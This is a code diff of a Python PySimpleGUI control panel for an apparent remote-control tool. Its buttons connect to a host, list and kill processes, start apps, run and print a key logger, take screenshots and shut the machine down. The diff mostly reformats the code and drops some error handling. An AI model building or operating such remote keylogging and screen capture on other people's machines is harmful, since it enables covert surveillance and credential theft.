@@ -1,9 +1,7 @@
 from client import Client
 from client import TMP_PATH
-import os
 import PySimpleGUI as sg
-from PIL import Image
-import time
+
 
 # GUI Layout
 sg.theme("Dark Purple 4")
@@ -57,88 +55,82 @@ layout = [[sg.Column(control_layout, element_justification='c'),
 
 
 def main():
-    client = Client()
-    window = sg.Window("Remote Control", layout,
-                       no_titlebar=False, size=(800, 520))
+  client = Client()
+  window = sg.Window("Remote Control", layout, no_titlebar=False, size=(800, 520))
 
-    while True:
-        try:
-            event, value = window.read()
-            if event == "Exit" or event == sg.WIN_CLOSED:
-                try:
-                    client.end_connection()
-                    break
-                except Exception as e:
-                    print(f"[ERROR] {e}")
-                    break
+  while True:
+    event, value = window.read()
+    if event == "Exit" or event == sg.WIN_CLOSED:
+      try:
+        client.end_connection()
+        break
+      except Exception as e:
+        print(f"[ERROR] {e}")
+        break
 
-            elif event == "Connect":
-                host = value[2]
-                port = value[3]
-                print(f'host: {host} port: {port}')
-                client.connect(host, port)
-            elif event == "Disconnect":
-                client.end_connection()
-            elif event == "View Processes":
-                window['OUTPUT'].Update('')
-                results = client.view_processes()
-                print(results)
-                window['OUTPUT'].update(value=results)
+    elif event == "Connect":
+      host = value[2]
+      port = value[3]
+      window['OUTPUT'].update('')
+      window['OUTPUT'].update(value=f"Connecting to {host}:{port}")
+      msg = client.connect(host, port)
+      window['OUTPUT'].update('')
+      window['OUTPUT'].update(value=msg)
 
-            elif event == "View Apps":
-                window['OUTPUT'].Update('')
-                results = client.view_apps()
-                print(results)
-                window['OUTPUT'].update(value=results)
+    elif event == "Disconnect":
+      msg = client.end_connection()
+      window['OUTPUT'].update('')
+      window['OUTPUT'].update(value=msg)
 
-            elif event == "Kill Process":
-                msg = client.kill_process(value[0])
-                window['OUTPUT'].Update('')
-                window['OUTPUT'].update(value=msg)
+    elif event == "View Processes":
+      msg = client.view_processes()
+      window['OUTPUT'].Update('')
+      window['OUTPUT'].update(value=msg)
 
-            elif event == "Start App":
-                msg = client.start_app(value[1])
-                window['OUTPUT'].update('')
-                window['OUTPUT'].update(value=msg)
+    elif event == "View Apps":
+      msg = client.view_apps()
+      window['OUTPUT'].Update('')
+      window['OUTPUT'].update(value=msg)
 
-            elif event == "Start Key Logger":
-                window['OUTPUT'].Update('')
-                results = client.start_keylogger()
-                window['OUTPUT'].update(value=results)
+    elif event == "Kill Process":
+      msg = client.kill_process(value[0])
+      window['OUTPUT'].Update('')
+      window['OUTPUT'].update(value=msg)
 
-            elif event == "Stop Key Logger":
-                window['OUTPUT'].Update('')
-                results = client.stop_keylogger()
-                window['OUTPUT'].update(value=results)
+    elif event == "Start App":
+      msg = client.start_app(value[1])
+      window['OUTPUT'].update('')
+      window['OUTPUT'].update(value=msg)
 
-            elif event == "Print Key Logger":
-                window['OUTPUT'].Update('')
-                client.save_keylogger()
-                results = ""
-                with open(os.path.join(TMP_PATH, "keylogger.txt"), 'r') as f:
-                    results = f.read()
-                window['OUTPUT'].update(value=results)
+    elif event == "Start Key Logger":
+      results = client.start_keylogger()
+      window['OUTPUT'].Update('')
+      window['OUTPUT'].update(value=results)
 
-            elif event == "Take Screenshot":
-                client.take_screenshot()
-                img = Image.open(os.path.join(TMP_PATH, "screenshot.png"))
-                img.show()
+    elif event == "Stop Key Logger":
+      results = client.stop_keylogger()
+      window['OUTPUT'].Update('')
+      window['OUTPUT'].update(value=results)
 
-            elif event == "Shutdown":
-                window['OUTPUT'].Update('')
-                results = client.shutdown()
-                window['OUTPUT'].update(value=results)
+    elif event == "Print Key Logger":
+      msg = client.save_keylogger()
+      window['OUTPUT'].Update('')
+      window['OUTPUT'].update(value=msg)
+      # with open(os.path.join(TMP_PATH, "keylogger.txt"), 'r') as f:
+      #   results = f.read()
+      # window['OUTPUT'].update(value=results)
 
-        except ConnectionResetError:
-            window['OUTPUT'].update(value="Server disconnected")
-        except ConnectionError:
-            window['OUTPUT'].update(value="Server not found")
-        except Exception as e:
-            print(e)
-            window['OUTPUT'].update(value="Something went wrong")
+    elif event == "Take Screenshot":
+      status = client.take_screenshot()
+      window['OUTPUT'].update('')
+      window['OUTPUT'].update(value=status)
+      
+    elif event == "Shutdown":
+      status = client.shutdown()
+      window['OUTPUT'].Update('')
+      window['OUTPUT'].update(value=status)
 
-    window.close()
-
+  window.close()
 
 if __name__ == '__main__':
     main()
